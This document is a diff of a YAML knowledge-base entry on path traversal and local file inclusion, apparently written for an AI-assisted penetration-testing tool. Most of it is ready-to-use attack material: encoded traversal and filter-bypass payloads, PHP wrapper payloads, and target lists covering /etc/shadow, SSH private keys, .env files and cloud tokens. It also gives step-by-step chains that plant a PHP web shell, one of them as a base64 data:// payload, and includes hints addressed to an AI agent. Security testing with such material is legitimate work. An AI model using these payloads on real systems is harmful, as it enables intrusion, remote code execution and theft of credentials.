@@ -1,53 +1,91 @@
 id: PATH_TRAVERSAL
-name: Path Traversal / Local File Inclusion
+name: Path Traversal / LFI — Comprehensive
 cwe:
 - CWE-22
-- CWE-98
 owasp: A01:2021 Broken Access Control
 severity_range: High - Critical
-description: Application uses user input in file paths without proper validation, allowing reading arbitrary files or including
-  malicious files.
+description: Path traversal lets attackers read files outside intended directory. LFI (Local File Inclusion) is PHP-specific
+  case where include() is called on user input. Can escalate to RCE via log poisoning, session file inclusion, /proc/self/environ,
+  or PHP wrappers.
 detection:
+  indicators:
+  - Parameters named file, path, doc, page, template, lang, theme
+  - URLs with file extensions (?page=home.html)
+  - Download/preview functionality
   payloads:
-    unix:
+    basic:
     - ../../../etc/passwd
-    - '....//....//....//etc/passwd'
-    - ..%2f..%2f..%2fetc%2fpasswd
-    - '%2e%2e/%2e%2e/%2e%2e/etc/passwd'
-    - ..%252f..%252f..%252fetc%252fpasswd
+    - ../../../../etc/passwd
+    - ../../../../../../etc/passwd
     - /etc/passwd
-    - '....\....\....\etc\passwd'
-    - ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
-    - /proc/self/environ
-    - /proc/self/cmdline
     windows:
     - ..\..\..\windows\win.ini
-    - '....\\....\\....\\windows\\win.ini'
-    - ..%5c..%5c..%5cwindows%5cwin.ini
+    - ..\..\..\boot.ini
     - C:\windows\win.ini
-    - C:/windows/win.ini
-    null_byte:
+    filter_bypass:
+    - '....//....//etc/passwd'
+    - ..%2f..%2f..%2fetc%2fpasswd
+    - ..%252f..%252fetc%252fpasswd
+    - '%2e%2e/%2e%2e/etc/passwd'
+    - ..%c0%af..%c0%afetc/passwd
+    - ..%5c..%5cwindows%5cwin.ini
+    null_byte_termination:
     - ../../../etc/passwd%00
     - ../../../etc/passwd%00.png
-    wrapper:
+    php_wrappers:
     - php://filter/convert.base64-encode/resource=index.php
-    - php://input
-    - data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
-    - expect://id
-  strategy:
-  - 1. Identify parameters that reference files (file=, path=, page=, template=, doc=, img=)
-  - 2. Test with ../../../etc/passwd (Linux) or ..\..\..\windows\win.ini (Windows)
-  - 3. Try URL encoding, double encoding, and Unicode normalization bypasses
-  - 4. Test null byte truncation (%00) for older runtimes
-  - 5. Test PHP wrappers if PHP detected (php://filter, php://input)
-  - 6. Check file upload + LFI combination for RCE
-  - 7. Test log file inclusion for RCE via access logs
-evidence_needed: Contents of a known file (e.g., root:x:0:0 from /etc/passwd) in response
+    - php://filter/read=string.rot13/resource=index.php
+    - php://input  (POST body becomes input)
+    - data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+    - expect://id  (PHP expect wrapper for RCE)
+    - zip://uploaded.zip%23inner.txt
+    - phar://uploaded.phar/test.txt  (PHP deserialization)
+  files_to_read:
+  - /etc/passwd
+  - /etc/shadow
+  - /etc/hosts
+  - /etc/hostname
+  - /proc/self/environ
+  - /proc/self/cmdline
+  - /proc/self/status
+  - /var/log/apache2/access.log
+  - /var/log/auth.log
+  - /home/user/.ssh/id_rsa
+  - /root/.ssh/id_rsa
+  - /var/www/html/config.php
+  - .env
+  - .git/config
+  - C:\windows\system32\drivers\etc\hosts
+  - C:\windows\repair\sam
+exploitation:
+  lfi_to_rce_via_log_poisoning:
+  - '1. Inject PHP into User-Agent header: <?php system($_GET[''c'']); ?>'
+  - 2. LFI to /var/log/apache2/access.log
+  - 3. Now visit ?file=/var/log/apache2/access.log&c=id
+  lfi_to_rce_via_session_file:
+  - 1. Submit username=<?php system($_GET['c']); ?>
+  - 2. Session file at /var/lib/php/sessions/sess_<PHPSESSID> now has PHP
+  - 3. LFI to that file with &c=id
+  lfi_to_rce_via_phpwrappers:
+  - data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+  ssh_key_theft:
+  - Read /home/<user>/.ssh/id_rsa
+  - Read /root/.ssh/authorized_keys
+  credentials_extraction:
+  - Read .env files for DB passwords, API keys
+  - Read application config files (config.php, settings.py, application.properties)
+  - Read .git/config and clone full repo from .git directory
 ai_research_hints:
-- Check if LFI can be chained with log poisoning for RCE
-- Test /proc/self/environ for environment variable leakage
-- Look for file download endpoints with path parameters
-- Test ZIP file extraction features for ZipSlip (path traversal in archive)
+- PHP apps with include() / require_once() are highest-yield for RCE
+- Modern apps that build file paths from user input but disallow ../ may allow absolute paths
+- 'Windows servers: try \\ alternatives, UNC paths, and ADS (alternate data streams)'
+- 'Container apps: try /etc/passwd to confirm, then /proc/self/environ for env vars'
+- 'Cloud apps: try /var/run/secrets/kubernetes.io/serviceaccount/token'
+- Download endpoints often have weaker filters than include endpoints
+tools:
+- dotdotpwn
+- kadimus (LFI-to-RCE)
+- fimap
 references:
-- https://portswigger.net/web-security/file-path-traversal
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
+- https://owasp.org/www-community/attacks/Path_Traversal
+- https://book.hacktricks.xyz/pentesting-web/file-inclusion
